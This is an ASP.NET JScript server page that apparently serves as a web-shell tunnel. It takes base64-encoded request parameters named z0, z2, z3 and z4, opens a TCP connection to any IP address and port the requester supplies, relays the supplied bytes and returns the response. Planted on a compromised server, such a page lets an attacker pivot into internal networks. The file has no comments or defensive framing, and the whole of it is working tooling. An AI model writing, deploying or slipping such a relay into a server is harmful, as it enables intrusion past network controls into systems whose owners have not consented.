<%

function Base64DecodeStr(base64Str : String) : String {
    if (!base64Str)
        return "";

    var bytes : Byte[] = System.Convert.FromBase64String(base64Str);
    return System.Text.Encoding.UTF8.GetString(bytes);
}

function Base64DecodeBytes(base64Str : String) : Byte[] {
    if (!base64Str)
        return new Byte[0];

    return System.Convert.FromBase64String(base64Str);
}

function Base64EncodeBytes(bytes : Byte[]) : String {
    if (bytes == null || bytes.Length == 0)
        return "";

    return System.Convert.ToBase64String(bytes);
}

function main() {
    var z0 = System.Web.HttpContext.Current.Request.Item["z0"];
    var z2 = System.Web.HttpContext.Current.Request.Item["z2"];
    var z3 = System.Web.HttpContext.Current.Request.Item["z3"];
    var z4 = System.Web.HttpContext.Current.Request.Item["z4"];

    if (!z0 || !z2 || !z3 || !z4)
        return;

    var action = Base64DecodeStr(z0);
    var target_ip = Base64DecodeStr(z2);
    var target_port_str = Base64DecodeStr(z3);
    var target_port = System.Int32.Parse(target_port_str);
    
    var data = Base64DecodeBytes(Base64DecodeStr(z4));

    if (action == "forward") {
        var client : System.Net.Sockets.TcpClient = null;
        var stream : System.Net.Sockets.NetworkStream = null;

        try {
            client = new System.Net.Sockets.TcpClient();
            
            var result = client.BeginConnect(target_ip, target_port, null, null);
            var success = result.AsyncWaitHandle.WaitOne(3000, false);
            
            if (!success || !client.Connected) {
                System.Web.HttpContext.Current.Response.Write("{\"status\":\"error\",\"msg\":\"Connect failed\"}");
                return;
            }

            stream = client.GetStream();
            stream.ReadTimeout = 500;

            if (data != null && data.Length > 0) {
                stream.Write(data, 0, data.Length);
            }

            var responseMS = new System.IO.MemoryStream();
            var buffer : Byte[] = new Byte[8192];
            var retry = 0;

            while (retry < 3) {
                System.Threading.Thread.Sleep(50);
                
                var hasData = false;
                while (stream.DataAvailable) {
                    var bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead > 0) {
                        responseMS.Write(buffer, 0, bytesRead);
                        hasData = true;
                    }
                }

                if (hasData && responseMS.Length > 0) {
                    break;
                }
                retry++;
            }

            var responseBytes = responseMS.ToArray();
            System.Web.HttpContext.Current.Response.Write("{\"status\":\"success\",\"data\":\"" + Base64EncodeBytes(responseBytes) + "\"}");

        } catch (ex) {
            System.Web.HttpContext.Current.Response.Write("{\"status\":\"error\",\"msg\":\"" + ex.Message + "\"}");
        } finally {
            if (stream != null)
                stream.Close();
            if (client != null)
                client.Close();
        }
    }
}

main();

%>